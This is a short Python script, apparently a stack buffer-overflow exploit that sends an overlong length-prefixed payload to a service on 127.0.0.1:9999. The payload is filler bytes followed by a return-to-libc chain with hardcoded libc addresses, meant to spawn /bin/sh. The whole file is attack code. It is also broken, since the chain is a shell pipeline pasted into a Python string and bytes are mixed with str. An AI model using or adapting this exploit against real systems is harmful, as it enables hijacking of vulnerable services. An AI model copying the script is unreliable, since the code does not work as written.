import socket, sys, struct
from struct import pack

TCP_IP = '127.0.0.1'
TCP_PORT = 9999 
BUFFER_SIZE = 1024 
#message = b"A" * 1024 + b"B" * 16 + struct.pack('<Q', 0x77777777777) #b"C" * 50 

message = b"A" * 1024 + b"B" * 16 + '(echo -n /bin/sh | xxd -p; printf %0130d 0; 
printf %016x $((0x7ffff6935000+0x22b1a)) | tac -rs..; 
printf %016x 0x7ffff6cf48c0 | tac -rs..; 
printf %016x $((0x7ffff6935000+0x46640)) | tac -rs..) | 
xxd -r -p'


data = pack('<Q%ds' % len(message), len(message), message)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
s.send(data)
s.close()
